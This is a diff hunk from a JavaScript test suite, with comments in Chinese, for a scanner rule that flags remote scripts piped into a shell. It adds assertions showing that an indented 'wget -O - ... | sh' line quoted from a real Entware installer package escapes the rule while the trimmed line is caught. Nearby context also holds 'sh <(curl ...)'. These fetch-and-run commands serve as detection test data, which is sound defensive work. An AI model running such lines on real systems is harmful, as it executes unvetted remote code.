@@ -4622,5 +4622,15 @@ test('T3.3-D2 观察（本轮不修，交回主控）：缩进的裸 `curl … |
     '`<(` 那一支的中间多一个 `-c` 就不命中 —— 本轮没动那一支，这是既有限度不是新洞');
   assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'],
     '去掉 `-c` 那一格照旧命中：上面那个 0 是那一支自己的形状，不是规则整体失效');
+  // 真包活体（这就是本轮不把 `^\s*` 加到**裸管道**那一支的理由）：
+  // entware-installer-for-magisk-master/customize.sh:142 逐字
+  //   '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh'
+  // 行首带四个空格的裸管道 ⇒ 改前 0、本轮之后仍然 0。收它会立刻把 18 包差集从 −0/+0 变成 +1，
+  // 而那一格的误伤数据本轮没量（工单 §4.4）⇒ 交回主控，不动。整包 high/block 是别的规则说的。
+  const entware142 = '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh';
+  assert.deepEqual(t33pipe(t33body(T33_SHE, entware142)), [],
+    '真包那一行今天就是 0 命中：缩进 + 裸管道，不在工单 §2 的授权面里');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, entware142.trim())), ['2/high'],
+    '同一行去掉行首缩进就命中 ⇒ 上面那个 0 的原因就是 `^` 那一支不接空白，不是规则没看见管道');
 });
 
